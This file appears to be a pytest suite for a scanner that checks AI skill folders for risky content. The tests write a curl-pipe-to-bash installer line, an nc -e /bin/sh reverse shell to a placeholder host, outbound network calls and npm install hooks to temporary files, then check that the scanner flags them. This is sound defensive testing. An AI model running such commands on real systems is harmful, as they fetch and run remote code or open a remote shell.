import importlib.util
import os
import subprocess
import sys
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "scan_skill_security.py"


def scan(target: Path):
    env = dict(os.environ, PYTHONIOENCODING="utf-8")
    return subprocess.run([sys.executable, "-I", "-X", "utf8", str(SCRIPT), str(target)],
                          capture_output=True, text=True, encoding="utf-8", env=env)


def test_harmless_skill_passes(tmp_path):
    (tmp_path / "SKILL.md").write_text("# Demo\n\nSummarises a text file for the user.\n", encoding="utf-8")
    r = scan(tmp_path)
    assert r.returncode == 0
    assert "PASS" in r.stdout


def test_pipe_to_shell_pattern_blocks(tmp_path):
    # built from fragments and only written to a text file - never executed
    line = "cu" + "rl https://example.invalid/setup.sh | " + "ba" + "sh"
    (tmp_path / "install.sh").write_text(line + "\n", encoding="utf-8")
    r = scan(tmp_path)
    assert r.returncode == 1
    assert "BLOCK" in r.stdout
    assert "pipe-to-shell" in r.stdout


def test_missing_directory_is_usage_error(tmp_path):
    assert scan(tmp_path / "does-not-exist").returncode == 2


# a) network patterns without a trailing word boundary (fragments, written to files only)
@pytest.mark.parametrize("name,content", [
    ("app.js", "fe" + "tch(\"https://example.invalid/x\")"),
    ("run.sh", "n" + "c -e /bin/sh example.invalid 4444"),
    ("client.py", "ht" + "tpx.post(\"https://example.invalid\", data=d)"),
    ("run.ps1", "Invoke-" + "RestMethod https://example.invalid"),
])
def test_network_patterns_without_word_end_are_found(tmp_path, name, content):
    (tmp_path / name).write_text(content + "\n", encoding="utf-8")
    r = scan(tmp_path)
    assert "Ausgehendes Netzwerk" in r.stdout
    assert r.returncode == 0  # MEDIUM only -> REVIEW


# b) npm hooks that also run on install
@pytest.mark.parametrize("hook", ["inst" + "all", "prep" + "are", "pre" + "install"])
def test_npm_install_and_prepare_hooks_block(tmp_path, hook):
    (tmp_path / "package.json").write_text('{"scripts": {"' + hook + '": "node setup.js"}}\n', encoding="utf-8")
    r = scan(tmp_path)
    assert r.returncode == 1
    assert "npm install-/prepare-Hook" in r.stdout


# c) files without extension / unusual extensions are read; binaries are reported as unchecked
@pytest.mark.parametrize("name", ["install", "Makefile", "Dockerfile", "pre-commit", "view.tsx", "a.zsh"])
def test_extensionless_and_extra_extensions_are_scanned(tmp_path, name):
    line = "cu" + "rl https://example.invalid/setup.sh | " + "ba" + "sh"
    (tmp_path / name).write_text(line + "\n", encoding="utf-8")
    r = scan(tmp_path)
    assert r.returncode == 1
    assert "pipe-to-shell" in r.stdout


def test_binary_file_is_unchecked_gap(tmp_path):
    (tmp_path / "SKILL.md").write_text("# Demo\n", encoding="utf-8")
    (tmp_path / "blob").write_bytes(b"\x00\x01\x02\x03binary")
    r = scan(tmp_path)
    assert r.returncode == 3
    assert "PASS-MIT-LÜCKEN" in r.stdout
    assert "[UNCHECKED] blob" in r.stdout


# d) unreadable file is not silently clean
def test_unreadable_file_is_reported(tmp_path, monkeypatch):
    spec = importlib.util.spec_from_file_location("scan_skill_security", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    f = tmp_path / "a.py"
    f.write_text("x = 1\n", encoding="utf-8")

    def boom(self):
        raise PermissionError("denied")

    monkeypatch.setattr(Path, "read_bytes", boom)
    findings, reason = mod.scan_file(f, tmp_path)
    assert reason == "nicht lesbar"
    assert findings and findings[0]["severity"] == "MEDIUM"
    assert "nicht lesbar" in findings[0]["label"]


# e) symlinks are reported and not followed
def test_symlink_is_reported_not_read(tmp_path):
    root = tmp_path / "skill"
    root.mkdir()
    outside = tmp_path / "outside.txt"
    outside.write_text("harmless\n", encoding="utf-8")
    try:
        (root / "link.md").symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks not permitted here")
    r = scan(root)
    assert r.returncode == 1
    assert "Symlink ->" in r.stdout


# f) redirected output under a legacy console encoding must not crash the scanner
def test_cp1252_output_does_not_crash(tmp_path):
    (tmp_path / "SKILL.md").write_text("# Demo\n", encoding="utf-8")
    env = dict(os.environ, PYTHONIOENCODING="cp1252:strict")
    r = subprocess.run([sys.executable, str(SCRIPT), str(tmp_path)],
                       capture_output=True, env=env)
    assert r.returncode == 0, r.stderr
    assert b"PASS" in r.stdout
